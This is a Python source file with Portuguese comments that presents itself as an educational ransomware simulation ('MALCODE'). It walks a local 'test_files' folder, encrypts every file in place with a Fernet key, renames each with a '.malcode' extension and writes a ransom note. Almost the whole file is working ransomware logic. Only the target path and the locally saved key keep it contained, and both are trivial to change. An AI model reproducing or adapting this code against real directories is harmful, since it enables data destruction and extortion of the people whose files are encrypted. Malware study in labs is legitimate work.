from cryptography.fernet import Fernet
import os

# --- DEFINIÇÃO DE CAMINHOS CHAVE ---
# Obtém o diretório ONDE o script ransomware.py está localizado (Malcode/ransomware_sim)
DIRETORIO_RAIZ = os.path.dirname(os.path.abspath(__file__))

# Define o caminho para a pasta alvo dos arquivos de teste (test_files/)
DIRETORIO_ALVO = os.path.join(DIRETORIO_RAIZ, 'test_files')

# Define o caminho para o arquivo da chave (continua na raiz do script, para segurança)
CHAVE_PATH = os.path.join(DIRETORIO_RAIZ, "chave.key")

# ⚠️ MODIFICAÇÃO AQUI: Define o caminho para a mensagem de resgate dentro de DIRETORIO_ALVO
RESGATE_PATH = os.path.join(DIRETORIO_ALVO, "LEIA ISSO.txt")
# ------------------------------------


# 1. Gerar uma chave de criptografia e salvar
def gerar_chave():
    chave = Fernet.generate_key()
    # Usa o caminho CHAVE_PATH
    with open(CHAVE_PATH, "wb") as chave_file:
        chave_file.write(chave)

# 2. Carregar chave salva
def carregar_chave():
    # Usa o caminho CHAVE_PATH
    return open(CHAVE_PATH, "rb").read()

# 3. Criptografar um único arquivo
def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    
    # ⚠️ Adicionando renomeação para simular a extensão do ransomware
    novo_caminho = arquivo + ".malcode" 
    
    dados_encriptados = f.encrypt(dados)
    
    # Reescreve o conteúdo criptografado
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)
        
    # Renomeia o arquivo original
    os.rename(arquivo, novo_caminho)

# 4. Encontrar arquivos para criptografar
def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            # Ignora os próprios scripts, a chave, a mensagem de resgate e arquivos de controle
            if nome in ["ransomware.py", "descriptografar.py", "LEIA ISSO.txt"]:
                continue
            if nome.endswith((".key", ".malcode", ".gitkeep")):
                continue
                
            caminho_completo = os.path.join(raiz, nome)
            # Verifica se é um arquivo (e não um diretório) antes de adicionar
            if os.path.isfile(caminho_completo):
                lista.append(caminho_completo)
    return lista

# 5. Mensagem de resgate
def criar_mensagem_resgate():
    # ⚠️ AGORA USA RESGATE_PATH (que aponta para test_files)
    with open(RESGATE_PATH, "w") as f:
        f.write("Seus arquivos foram criptografados pela simulação MALCODE!\n")
        f.write("Este é um projeto educacional.\n")
        f.write("A chave de descriptografia foi salva como 'chave.key' no diretório raiz do script.\n")

# 6. Execução principal
def main():
    # Apenas gera a chave se ela não existir
    if not os.path.exists(CHAVE_PATH):
        gerar_chave()
        
    chave = carregar_chave()
    
    # Usa o DIRETORIO_ALVO já construído para iniciar a busca
    arquivos = encontrar_arquivos(DIRETORIO_ALVO)
    
    if not arquivos:
        print("AVISO: Nenhum arquivo alvo encontrado em test_files.")
        return

    for arquivo in arquivos:
        # Se houver um arquivo '.malcode' (já criptografado) ele não tenta de novo
        if arquivo.endswith(".malcode"):
            continue 
            
        criptografar_arquivo(arquivo, chave)
        
    criar_mensagem_resgate()
    print("--- RANSOMWARE EXECUTADO COM SUCESSO ---")
    print(f"Arquivos em {DIRETORIO_ALVO} criptografados!")
    print(f"Mensagem de resgate salva em: {RESGATE_PATH}")

if __name__ == "__main__":
    main()










